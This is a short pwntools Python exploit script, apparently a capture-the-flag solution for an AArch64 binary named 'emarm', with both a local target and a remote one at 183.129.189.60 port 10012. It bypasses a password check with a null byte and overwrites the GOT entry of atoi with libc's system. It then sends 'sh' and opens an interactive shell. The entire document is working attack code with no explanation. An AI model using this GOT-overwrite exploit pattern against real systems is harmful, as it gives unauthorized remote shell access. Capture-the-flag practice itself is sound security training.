from pwn import *
local=1
elf=ELF('./emarm')
libc=elf.libc
def exp():
        try:
            if local:
                #sh=process(["qemu-aarch64","-L","./","./emarm"])
                sh=process("./emarm")
                # sh=process(["qemu-aarch64","-g","1234","-L","./","./a"])
                libc.address=0x400084d000
                # 0x00000040008b8308
            else:
                sh=remote('183.129.189.60','10012')
                libc.address=0x4000830000
                # 0x000000400089b308

            sh.sendlineafter('passwd:\n','\x00')
            sh.send(str(elf.got['atoi']))
            sh.sendafter('success',p64(libc.sym['system']))
            sh.send('sh\x00')
            sh.interactive()
        except:
            sh.close()

exp()
